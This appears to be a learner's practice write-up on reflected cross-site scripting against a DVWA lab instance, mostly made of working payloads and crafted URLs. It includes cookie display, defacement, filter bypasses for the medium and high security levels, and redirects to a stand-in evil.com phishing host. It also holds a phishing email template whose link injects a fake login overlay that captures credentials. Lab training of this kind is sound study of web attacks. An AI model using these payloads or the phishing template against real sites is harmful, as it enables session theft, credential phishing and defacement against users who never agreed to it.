# Reflected XSS


## What is Reflect XSS?
Reflected XSS is a type of cross-site scripting attack where malicious input is immediately echoed by a web application in its response, allowing attackers to execute scripts in a victim’s browser.

## How Reflected XSS Works
Reflected XSS (also called non-persistent XSS) occurs when:
• 	User input is sent via a URL or form field
• 	The application reflects that input directly in the response without proper sanitization
• 	The malicious script gets executed in the victim’s browser when they click a crafted link



# Reflected XSS Methodology

- In this i used target `DVWA`: http://192.168.100.97:8080/vulnerabilities/xss_r/
- Also in this first i set it to `LOW Level`.


## 1. BASIC REFLECTED XSS TESTS (LOW SECURITY)
- This our `target`:
<img width="902" height="728" alt="image" src="https://github.com/user-attachments/assets/249da597-a9da-40fd-85fa-8ae0de09f545" />

- In this if i input `Hello`
<img width="897" height="586" alt="image" src="https://github.com/user-attachments/assets/3da7034d-c801-4405-a527-412500c141e7" />


### Alert
````
<script>alert('Reflected XSS')</script>
````
<img width="422" height="137" alt="image" src="https://github.com/user-attachments/assets/6ddb7fe9-35b4-4ee9-a0b3-e3356765158f" />

- So this our `Result`.


### Cookie Display
````
<script>alert(document.cookie)</script>
````
<img width="901" height="484" alt="image" src="https://github.com/user-attachments/assets/108ec278-a5f5-4014-847f-3eb07b1b0470" />

<img width="431" height="216" alt="image" src="https://github.com/user-attachments/assets/4c3f2fe7-bf80-4382-b46d-047beeca4bb5" />

- So in this we see our `session cookies`.


### Image Based XSS
````
<img src=x onerror=alert('Image XSS')>
````
<img width="905" height="489" alt="image" src="https://github.com/user-attachments/assets/d9c427cb-04fe-4833-a67a-69722708a296" />

---

## 2. Use with Burp Suite
- First open `Burp Suite`:
<img width="1905" height="834" alt="image" src="https://github.com/user-attachments/assets/15a633af-97bc-4822-b18d-c4cf5976efd4" />

- And in my `Browser` i click `submite` in this:
<img width="910" height="554" alt="image" src="https://github.com/user-attachments/assets/709a9078-fd47-4eb5-a35b-de7926a5bcb0" />

- And see this:
<img width="920" height="328" alt="image" src="https://github.com/user-attachments/assets/a350b794-aa50-4c49-9d28-c41b9767ecba" />

- And see this in `Browser`:
<img width="1610" height="837" alt="image" src="https://github.com/user-attachments/assets/4ae9a529-7e47-443a-9123-321a4becc2bd" />


## Page Defacement
````
<script>document.body.innerHTML='<h1>HACKED</h1>'</script>
````
- In this i used it with my `Burp Suite`:
<img width="1575" height="870" alt="image" src="https://github.com/user-attachments/assets/ee20a7e1-54b6-4893-aced-7fd6d0574738" />

<img width="1576" height="737" alt="image" src="https://github.com/user-attachments/assets/75464173-d3bc-46c0-b49a-2314f08ad4ea" />

- Also in this we can change to something like in this i want to change `Payload`:
<img width="1573" height="757" alt="image" src="https://github.com/user-attachments/assets/48b23f20-ac83-4676-a50d-288bac003d4d" />

- In this we also can `encode` Press (Ctrl + U) -> and after click on `Send`.
<img width="1578" height="757" alt="image" src="https://github.com/user-attachments/assets/88df8a6e-9716-4608-915c-56608583c1ff" />

<img width="1577" height="458" alt="image" src="https://github.com/user-attachments/assets/24652ff9-5c03-48db-bf9c-1adabc041d73" />

---


## 3. CREATING MALICIOUS LINKS

### Basic Malicious URL Construction
- The vulnerability is in the URL parameter. Create these malicious URLs:

#### Basic Alter:
````
http://192.168.100.97:8080/vulnerabilities/xss_r/?name=<script>alert('XSS')</script>
````
<img width="1338" height="597" alt="image" src="https://github.com/user-attachments/assets/89e9cb11-a354-4f5c-a28b-962cc56ce105" />


#### Cookie Stealer:
````
http://192.168.100.97:8080/vulnerabilities/xss_r/?name=<script>alert(document.cookie)</script>
````
<img width="1310" height="679" alt="image" src="https://github.com/user-attachments/assets/af88c375-e383-4299-9c11-408ee61f5b2d" />


#### Redirect Attack:
````
http://192.168.100.97:8080/vulnerabilities/xss_r/?name=<script>window.location='http://evil.com'</script>
````
<img width="1347" height="696" alt="image" src="https://github.com/user-attachments/assets/157b034b-37c2-433d-a15f-369ee5254ab5" />

- In this when i Press `Enter` it will show:
<img width="1919" height="822" alt="image" src="https://github.com/user-attachments/assets/b9354dc5-52f6-4125-b65b-2b549474cf57" />


---



## 4. REDIRECT AND PHISHING ATTACKS

### Immediate Redirect
````
http://192.168.100.97:8080/vulnerabilities/xss_r/?name=<script>window.location='http://evil.com'</script>
````
<img width="1919" height="883" alt="image" src="https://github.com/user-attachments/assets/34fc02ac-d66f-4d4d-9f5d-3d521e519d7d" />



### Delayed Redirect
````
http://192.168.100.97:8080/vulnerabilities/xss_r/?name=<script>setTimeout(function() {  window.location = 'http://192.168.100.97:8080/vulnerabilities/xss_r/?hacked=true';}, 3000);alert('You will be redirected in 3 seconds...');</script>
````
- Or we can use this:
````
http://192.168.100.97:8080/vulnerabilities/xss_r/?name=<script>
setTimeout(function() {
  window.location = 'http://192.168.100.97:8080/vulnerabilities/xss_r/?hacked=true';
}, 3000);
alert('You will be redirected in 3 seconds...');
</script>
````
<img width="1316" height="606" alt="image" src="https://github.com/user-attachments/assets/70136598-1539-444c-86e9-b2230f36c211" />



### Conditional Redirect (If Logged In)
````
http://192.168.100.97:8080/vulnerabilities/xss_r/?name=%3Cscript%3Eif(document.cookie.includes(%27PHPSESSID%27))%20{%20%20alert(%27You%20are%20logged%20in!%20Redirecting...%27);%20%20window.location%20=%20%27http://evil.com/phishing%27;}%20else%20{%20%20alert(%27Please%20log%20in%20first%27);}%3C/script%3E
````
- Or this it the same:
````
http://192.168.100.97:8080/vulnerabilities/xss_r/?name=<script>
if(document.cookie.includes('PHPSESSID')) {
  alert('You are logged in! Redirecting...');
  window.location = 'http://evil.com/phishing';
} else {
  alert('Please log in first');
}
</script>
````
<img width="1309" height="663" alt="image" src="https://github.com/user-attachments/assets/e972380b-9952-4fbd-b7cd-2c317c21713b" />



----



#  BYPASSING SECURITY LEVELS

## Medium Security Bypasses
<img width="818" height="693" alt="image" src="https://github.com/user-attachments/assets/2916521f-e5a0-4d59-a875-47ed1208c2c8" />


### Case Variation
````
http://192.168.100.97:8080/vulnerabilities/xss_r/?name=<ScRiPt>alert(1)</ScRiPt>
````
<img width="795" height="444" alt="image" src="https://github.com/user-attachments/assets/755e5d3a-1c2a-431e-a941-027cde3ea29a" />

<img width="1038" height="715" alt="image" src="https://github.com/user-attachments/assets/436ab667-6533-47fa-b589-d27dea9a54c6" />

<img width="808" height="452" alt="image" src="https://github.com/user-attachments/assets/5c076192-84c4-4679-a50e-e56fef884167" />


### Nested Script Tags:
````
http://192.168.100.97:8080/vulnerabilities/xss_r/?name=<scr<script>ipt>alert(1)</script>
````
<img width="1036" height="544" alt="image" src="https://github.com/user-attachments/assets/ef53c4b7-f3a2-4a08-98f1-dd8b04259307" />

<img width="764" height="436" alt="image" src="https://github.com/user-attachments/assets/81037eb0-1df6-441c-bd05-a99c0c5915ba" />


### Image Tag Bypass:
````
http://192.168.100.97:8080/vulnerabilities/xss_r/?name=<img src=x onerror=alert(1)>
````
<img width="798" height="440" alt="image" src="https://github.com/user-attachments/assets/941990c3-4db8-4bdc-b672-1ea9accb07ea" />



### SVG Bypass:
````
http://192.168.100.97:8080/vulnerabilities/xss_r/?name=<svg onload=alert(1)>
````
<img width="806" height="428" alt="image" src="https://github.com/user-attachments/assets/ac35a205-8cb7-479b-97cb-01e5fd8fec9f" />

<img width="821" height="560" alt="image" src="https://github.com/user-attachments/assets/d55dfb2b-13ac-468f-8f44-cacb55dc2b62" />

---

## High Security Bypasses (Very Limited)

<img width="807" height="696" alt="image" src="https://github.com/user-attachments/assets/32fbdb3d-8d2a-40ed-b7ac-37dda9984f79" />

### Data URI Attempt:
````
http://192.168.100.97:8080/vulnerabilities/xss_r/?name=<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgnSGlnaCcpPC9zY3JpcHQ+">
````
<img width="797" height="572" alt="image" src="https://github.com/user-attachments/assets/77a85d90-3643-4a3a-a945-6a15756c4adf" />


### Iframe Attempt
````
http://192.168.100.97:8080/vulnerabilities/xss_r/?name=<iframe src="javascript:alert('High')">
````
<img width="799" height="446" alt="image" src="https://github.com/user-attachments/assets/575a9542-cae5-4b4f-9084-745823d17737" />

---


## REAL-WORLD ATTACK SCENARIOS

### URL Shortener Obfuscation
````
http://192.168.100.97:8080/vulnerabilities/xss_r/?name=%3Cscript%3Ealert(1)%3C/script%3E
````
<img width="809" height="437" alt="image" src="https://github.com/user-attachments/assets/9545d1e5-98a3-4739-8af1-31d0eea20340" />



### Phishing Email Template
````
sudo mousepad phishing.html
````
````
sudo chmod +x phishing.html
````
````
<!DOCTYPE html>
<html>
<head>
    <title>Phishing Simulation</title>
</head>
<body style="font-family: Arial, sans-serif; max-width: 600px; margin: 20px auto; padding: 20px; border: 1px solid #ccc; background: #f9f9f9;">
    <h2> Fake Phishing Email</h2>
    <p><strong>From:</strong> security@trusted-bank.com</p>
    <p><strong>Subject:</strong>  Important Security Update – Action Required</p>
    <hr>
    <p>Dear Valued User,</p>
    <p>We've detected unusual login activity on your account from a new device.</p>
    <p><strong>Please verify your identity immediately</strong> by clicking the button below:</p>
    
    <a href="http://192.168.127.128/dvwa/vulnerabilities/xss_r/?name=<script>var overlay=document.createElement('div');overlay.innerHTML='<div style=\"position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.85);z-index:9999;display:flex;justify-content:center;align-items:center;font-family:Arial,sans-serif;\"><div style=\"background:linear-gradient(135deg, #667eea 0%, #764ba2 100%);padding:30px;border-radius:15px;box-shadow:0 10px 30px rgba(0,0,0,0.3);width:350px;color:white;\"><div style=\"text-align:center;margin-bottom:20px;\"><h2 style=\"margin:0;font-size:24px;\"> Security Update Required</h2><p style=\"margin:10px 0;font-size:14px;opacity:0.9;\">Your session has expired for security reasons</p></div><div style=\"background:rgba(255,255,255,0.1);padding:20px;border-radius:10px;\"><input type=\"text\" id=\"loginUsername\" placeholder=\" Email Address\" style=\"width:100%;padding:12px;margin:8px 0;border:none;border-radius:6px;font-size:14px;\"><input type=\"password\" id=\"loginPassword\" placeholder=\" Password\" style=\"width:100%;padding:12px;margin:8px 0;border:none;border-radius:6px;font-size:14px;\"><button onclick=\"submitCredentials()\" style=\"width:100%;padding:12px;background:#4CAF50;color:white;border:none;border-radius:6px;font-size:16px;font-weight:bold;cursor:pointer;margin-top:10px;\">Verify Identity</button></div><p style=\"text-align:center;font-size:12px;margin-top:15px;opacity:0.7;\">This is required to protect your account</p></div></div>';document.body.appendChild(overlay);function submitCredentials(){var u=document.getElementById('loginUsername').value;var p=document.getElementById('loginPassword').value;alert('VERIFICATION COMPLETE\\nUsername: '+u+'\\nPassword: '+p+'\\n\\nThank you for verifying your identity.');}</script>" 
       style="display: inline-block; padding: 12px 24px; background: #4CAF50; color: white; text-decoration: none; border-radius: 6px; font-weight: bold;">
         Verify My Account
    </a>

    <p style="margin-top: 20px; font-size: 12px; color: #666;">
        This message was sent for your security. If you did not request this, please ignore it.
    </p>
</body>
</html>
````
<img width="313" height="172" alt="image" src="https://github.com/user-attachments/assets/36284d3c-a13b-48fe-bba5-dad692e05583" />

- In `href="http://192.168.100.97/dvwa/vulnerabilities/xss_r/`. In `192.168.127.128` is my kali `IP` 


- Open the Phishing Email in Your Browser
  - Open File Manager
  - Double-click phishing.html
  - It will open in your browser as a fake email You’ll see:
  - A professional-looking "security alert"
  - A green `Verify My Account` button

<img width="1025" height="884" alt="image" src="https://github.com/user-attachments/assets/fc0b86be-40c1-4e7f-b99d-71be4c00de75" />

- After when i open `phishing.html` i see this:
<img width="751" height="816" alt="image" src="https://github.com/user-attachments/assets/30c4bf81-a7d1-426b-ba2e-43f285494b41" />

- But in this i can't show demo this will requirement kali need to install `DVWA` in kali machine.


----




## Most Effective Payloads

### Low level
- But in this we test with `DVWA`, so first i set it to `Low Level security`:
````
<script>alert('XSS')</script>
````
<img width="610" height="583" alt="image" src="https://github.com/user-attachments/assets/ce14a8f8-0110-41e6-bf25-1cfa9aa36c5c" />


````
<img src=x onerror=alert(1)>
````
<img width="812" height="440" alt="image" src="https://github.com/user-attachments/assets/1e890d16-e91e-4e1e-b65f-f2316b7e23bd" />

- Or we can use direct link:
````
http://192.168.100.97:8080/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E#
http://192.168.100.97:8080/vulnerabilities/xss_r/?name=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E#
````

---


### Medium Level
- To testing:
<img width="812" height="680" alt="image" src="https://github.com/user-attachments/assets/74445efc-e8d9-4b98-ac59-815019ba28da" />

````
<IMG SRC=x ONERROR=alert(1)>
````
- Or we can use direct link:
````
http://192.168.100.97:8080/vulnerabilities/xss_r/?name=%3CIMG+SRC%3Dx+ONERROR%3Dalert%281%29%3E#
````
<img width="813" height="442" alt="image" src="https://github.com/user-attachments/assets/5718add8-5c96-4f07-ab57-c3d8376ea1f2" />


````
<svg onload=alert(1)>
````
- Or
````
http://192.168.100.97:8080/vulnerabilities/xss_r/?name=%3Csvg+onload%3Dalert%281%29%3E#
````
<img width="599" height="625" alt="image" src="https://github.com/user-attachments/assets/e75fe09e-7a28-4cbf-9cc0-e03f7f43bc8b" />

<img width="805" height="436" alt="image" src="https://github.com/user-attachments/assets/1dedc28f-f040-4fb9-9f64-837e69c11548" />


### High Level
````
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
````
- or
````
http://192.168.100.97:8080/vulnerabilities/xss_r/?name=%3Cobject+data%3D%22data%3Atext%2Fhtml%3Bbase64%2CPHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg%3D%3D%22%3E#
````
<img width="807" height="456" alt="image" src="https://github.com/user-attachments/assets/fb335b9e-e1d9-4186-a0f1-cb599d9e48a9" />


----



---

## Finished Of Reflected XSS

---


---

## Practice by: Nin Kanong (k4n0ng)

---

### Date: 28/10/2025

----
